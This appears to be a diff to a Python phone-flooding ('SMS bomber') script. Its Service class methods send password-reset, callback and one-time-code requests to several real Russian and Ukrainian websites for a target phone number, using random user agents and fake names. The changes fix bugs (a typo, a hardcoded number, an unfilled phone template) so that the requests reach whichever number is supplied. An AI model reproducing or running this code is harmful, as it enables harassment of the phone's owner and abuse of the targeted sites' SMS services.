@@ -22,7 +22,7 @@ def phone_mask(phone, maska):
 class Service:
 
     def __init__(self):
-        pass 
+        pass
 
     def number(self, number_phone):
         self.phone = number_phone
@@ -418,7 +418,7 @@ class Service:
 
     def mngogomenu(self):
         requests.get(f"http://mnogomenu.ru/office/password/reset/{self.phone_mask}", headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
-        requests.post('http://mnogomenu.ru/ajax/callback/send', data={f"uname={name()}&uphone=%2B{phone_mask(phone=(sel.phone[1:]), maska='#+(###)+###+##+##')}"}, headers={'X-Requested-With':'XMLHttpRequest',
+        requests.post('http://mnogomenu.ru/ajax/callback/send', data={f"uname={name()}&uphone=%2B{phone_mask(phone=(self.phone[1:]), maska='#+(###)+###+##+##')}"}, headers={'X-Requested-With':'XMLHttpRequest',
          'Connection':'keep-alive',
          'Pragma':'no-cache',
          'Cache-Control':'no-cache',
@@ -2385,7 +2385,7 @@ class Service:
         headers_copy = data_headers
         headers_copy['User-Agent'] = user_agent()
 
-        requests.post('https://qlean.ru/widget-form/http/requestotp', data={"phone":"+# (###) ###-##-##"}, headers=headers_copy)
+        requests.post('https://qlean.ru/widget-form/http/requestotp', data={"phone":phone_mask(self.phone_not_pluse,"+# (###) ###-##-##")}, headers=headers_copy)
 
     def taxi7788(self):
         headers_copy = data_headers
@@ -2466,7 +2466,7 @@ class Service:
         headers_copy['User-Agent'] = user_agent()
 
         requests.options('https://admin.topcredit.ua/api/sms/password-verification/create', headers=headers_copy)
-        requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone":"380953855684"}, headers=headers_copy)
+        requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": self.phone_not_pluse}, headers=headers_copy)
 
     def admin1groshivsimcom(self):
         headers_copy = data_headers
